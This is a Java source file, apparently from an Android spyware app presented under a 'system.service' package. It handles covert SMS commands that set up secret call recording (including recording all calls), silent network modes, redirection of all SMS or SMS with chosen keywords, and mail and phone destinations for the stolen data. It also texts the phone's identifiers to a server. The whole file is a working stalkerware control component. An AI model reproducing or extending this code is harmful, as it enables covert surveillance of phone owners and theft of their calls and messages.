package system.service;

import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import system.service.activity.GlobalPrefActivity;
import system.service.activity.NETWORK_CONNECT_MODE;
import system.service.config.ConfigCtrl;
import system.service.feature.sms.SmsCtrl;
import android.content.Context;

import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.LANG;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.sms.AuthSms;
import com.particle.inspector.common.util.sms.SmsConsts;
import com.particle.inspector.common.util.sms.SuperLoggingSms;

public class IndicationHandler 
{
	public static void handleIndicationSms(Context context, String smsBody, String incomingPhoneNum) 
	{
		// When comes here, that means the phone has received the SMS, so now it must be capable to send SMS.
		
		// Make sure the indicaiton is coming from qulified phone
		if (!isQualifiedIncomingNum(context, incomingPhoneNum)) {
			// Do not return SMS to the phone about the failure
			return;
		}
		
		// -------------------------------------------------------
		// #0#<license key>: activate apk
		// #0#OFF: deactivate apk, and send SMS to server to clear using record to make it usable in other phone
		if (smsBody.startsWith(SmsConsts.INDICATION_KEY)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH)
			{
				LICENSE_TYPE type = LicenseCtrl.calLicenseType(context, indication);
				if (type == LICENSE_TYPE.NOT_LICENSED || type == LICENSE_TYPE.TRIAL_LICENSED) {
					String msg = context.getResources().getString(R.string.indication_register_ng);
					SmsCtrl.sendSms(incomingPhoneNum, msg);
					return;
				}
				
				// If this phone has not been registerred yet with this key, send auth SMS to server for registration
				// and server will send response SMS to the phone (Auth,<key>,<Target Phone Number>,OK/NG)
				else if (type == LICENSE_TYPE.FULL_LICENSED || type == LICENSE_TYPE.PART_LICENSED) {
					String currentKey = ConfigCtrl.getLicenseKey(context);
					if (currentKey == null || !indication.equalsIgnoreCase(currentKey)) {
						boolean ret = SmsCtrl.sendAuthSms(context, indication);
						if (ret) {
							ConfigCtrl.setAuthSmsSentDatetime(context, new Date());
						}
					} else {
						String msg = context.getResources().getString(R.string.indication_register_ng_duplicate_key);
						SmsCtrl.sendSms(incomingPhoneNum, msg);
					}
				}
				
				// If it is Super License Key, do not need to get response validation from server
				else if (type == LICENSE_TYPE.SUPER_LICENSED) {
					// Save license key info to SharedPreferences
					if (!ConfigCtrl.setLicenseKey(context, smsBody) || 
						!ConfigCtrl.setLicenseType(context, type)) {
						String msg = context.getResources().getString(R.string.indication_register_ng_cannot_write);
						SmsCtrl.sendSms(incomingPhoneNum, msg);
						return;
					}

					// Send a SMS to server for logging info
					String deviceID = DeviceProperty.getDeviceId(context);
					String phoneNum = DeviceProperty.getPhoneNumber(context);
					String phoneModel = DeviceProperty.getDeviceModel();
					String androidVer = DeviceProperty.getAndroidVersion();
					LANG lang = DeviceProperty.getPhoneLang();
					SuperLoggingSms sms = new SuperLoggingSms(smsBody, deviceID, phoneNum, phoneModel, androidVer, lang);
					String smsStr = sms.toString();
					String srvAddr = context.getResources().getString(R.string.srv_address).trim();
					SmsCtrl.sendSms(srvAddr, smsStr);
				}
			}
			// Unregister indication
			else if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
				LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
				// Only can deactivate FULL/PART/SUPER license key
				if (type == LICENSE_TYPE.NOT_LICENSED || type == LICENSE_TYPE.TRIAL_LICENSED) return;
				
				// Send unregister SMS to server
				boolean ret = SmsCtrl.sendUnregisterSms(context);
				if (!ret) {
					// If not success, should send SMS to tell the receiver that it fails
					SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_unregister_ng));
				} else {
					ConfigCtrl.setUnregistererPhoneNum(context, incomingPhoneNum);
				}
			}
		}
		
		// -------------------------------------------------------
		// #1#<mail address> <password>: set self sender
		else if (smsBody.startsWith(SmsConsts.INDICATION_SENDER)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
			
			String[] parts = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, " ").split(" ");
			if (parts.length < 2) {
				// Send SMS to warn user
				String strContent = context.getResources().getString(R.string.indication_set_selfsender_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			
			String mailAddr = parts[0];
			String pwd      = parts[1];
			
			GlobalPrefActivity.setSenderMail(context, mailAddr);
			GlobalPrefActivity.setSenderPassword(context, pwd);
			
			// Send SMS to user to let him known the result
			String strContent = context.getResources().getString(R.string.indication_set_selfsender_ok);
			SmsCtrl.sendSms(incomingPhoneNum, strContent);
		}
		
		// -------------------------------------------------------
		// #2#<mail address>: change receiver mail address
		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_MAIL)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0 && StrUtils.validateMailAddress(indication)) {
				GlobalPrefActivity.setReceiverMail(context, indication);
				
				// Send SMS to tell user the result
				String strContent = context.getResources().getString(R.string.indication_set_recv_mail_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				
				// Send Info SMS to server to update receiver info
				SmsCtrl.sendReceiverInfoSms(context);
			} else {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_recv_mail_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #3#<receiver phone number>: change receiver phone number
		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_PHONENUM)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
					
			if (indication.length() > 0) {
				GlobalPrefActivity.setReceiverPhoneNum(context, indication);
				
				// Send SMS to tell user the result
				String strContent = context.getResources().getString(R.string.indication_set_recv_phonenum_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				
				// Send Info SMS to server to update receiver info
				SmsCtrl.sendReceiverInfoSms(context);
			} else {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_recv_phonenum_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #4#<interval days>: change get info interval days
		else if (smsBody.startsWith(SmsConsts.INDICATION_INTERVAL)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
			int days = 1;
			try {
				days = Integer.parseInt(indication);
			} catch (Exception ex) {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_getinfo_interval_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			
			if (days < 1 ) { days = 1; } 
			else if (days > 7) { days = 7; }
			
			GlobalPrefActivity.setInfoInterval(context, String.valueOf(days));
			String strContent = context.getResources().getString(R.string.indication_set_getinfo_interval_ok);
			SmsCtrl.sendSms(incomingPhoneNum, strContent);
		}
		
		// -------------------------------------------------------
		// #5#<target number>: set recording target numbers and cancel recording all
		// #5#ALL: recording all phone calls
		else if (smsBody.startsWith(SmsConsts.INDICATION_TARGET_NUM)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
			
			if (indication.equalsIgnoreCase(SmsConsts.ALL)) {
				GlobalPrefActivity.setRecordAll(context, true);
				String strContent = context.getResources().getString(R.string.indication_set_targetall_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			} else {
				String[] numbers = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.TARGET_NUMBER_BREAKER)
						 					 .split(GlobalPrefActivity.TARGET_NUMBER_BREAKER);
				boolean valid = true;
				if (numbers.length <= 0 || numbers.length > GlobalPrefActivity.MAX_TARGET_NUM_COUNT) {
					valid = false;
				} else {
					Pattern p = Pattern.compile(RegExpUtil.RECORD_TARGET_NUM);
					for (int i=0; i < numbers.length; i++) {
				    	Matcher matcher = p.matcher(numbers[i]);
				    	if (!matcher.matches()) {
				    		valid = false;
				    		break;
				    	}
					}
				}
				
				if (valid) {
					GlobalPrefActivity.setRecordTargetNum(context, indication);
					GlobalPrefActivity.setRecordAll(context, false);// Cancel recording all at meantime
					String strContent = context.getResources().getString(R.string.indication_set_targetnum_ok);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
				} else {
					String strContent = context.getResources().getString(R.string.indication_set_targetnum_ng);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
				}
			}
		}
		
		// -------------------------------------------------------
		// #6#<network mode>: set network mode
		else if (smsBody.startsWith(SmsConsts.INDICATION_NETWORK_MODE)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
			
			if (!indication.equalsIgnoreCase(SmsConsts.ACTIVE) && 
				!indication.equalsIgnoreCase(SmsConsts.SILENT) &&
				!indication.equalsIgnoreCase(SmsConsts.WIFIACTIVE) &&
				!indication.equalsIgnoreCase(SmsConsts.WIFISILENT)
				) {
				String strContent = context.getResources().getString(R.string.indication_set_network_mode_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			
			if (indication.equalsIgnoreCase(SmsConsts.ACTIVE)) {
				GlobalPrefActivity.setNetworkConnectMode(context, NETWORK_CONNECT_MODE.ACTIVE);
			} else if (indication.equalsIgnoreCase(SmsConsts.SILENT)) {
				GlobalPrefActivity.setNetworkConnectMode(context, NETWORK_CONNECT_MODE.SILENT);
			} else if (indication.equalsIgnoreCase(SmsConsts.WIFIACTIVE)) {
				GlobalPrefActivity.setNetworkConnectMode(context, NETWORK_CONNECT_MODE.WIFIACTIVE);
			} else { // SmsConsts.WIFISILENT
				GlobalPrefActivity.setNetworkConnectMode(context, NETWORK_CONNECT_MODE.WIFISILENT);
			}
			
			String strContent = context.getResources().getString(R.string.indication_set_network_mode_ok);
			SmsCtrl.sendSms(incomingPhoneNum, strContent);
		}
		
		// -------------------------------------------------------
		// #7#<sensitive words>: change sensitive words
		else if (smsBody.startsWith(SmsConsts.INDICATION_SENS_WORDS)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
			
			// When it is OFF or off, we disable redirect all SMS
			if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
				GlobalPrefActivity.setRedirectAllSms(context, false);
				String strContent = context.getResources().getString(R.string.indication_disable_redirect_all_sms_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			// When it is ON or on, we enable redirect all SMS
			else if (indication.equalsIgnoreCase(SmsConsts.ON)) {
				GlobalPrefActivity.setRedirectAllSms(context, true);
				String strContent = context.getResources().getString(R.string.indication_enable_redirect_all_sms_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			else {
				String oriWords = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
				String[] words = oriWords.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
				if (words.length == 0 || words.length > GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT) {
					// Send SMS to warn the user
					String strContent = context.getResources().getString(R.string.indication_set_sens_words_ng);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
					return;
				}
				
				GlobalPrefActivity.setSensitiveWords(context, indication);
				String strContent = context.getResources().getString(R.string.indication_set_sens_words_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		
	} // End of handleIndicationSms()
	
	// Rules:
	// All remote indications only accept SMS from recv phone
	private static boolean isQualifiedIncomingNum(Context context, String incomingPhoneNum) 
	{
		String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
		if (recvPhoneNum == null || recvPhoneNum.length() <= 0) {
			return true;
		} 
		
		// Indication only accept recv phone
		else {
			if (incomingPhoneNum.contains(recvPhoneNum)) return true;
			else return false;
		}
	}
	
}
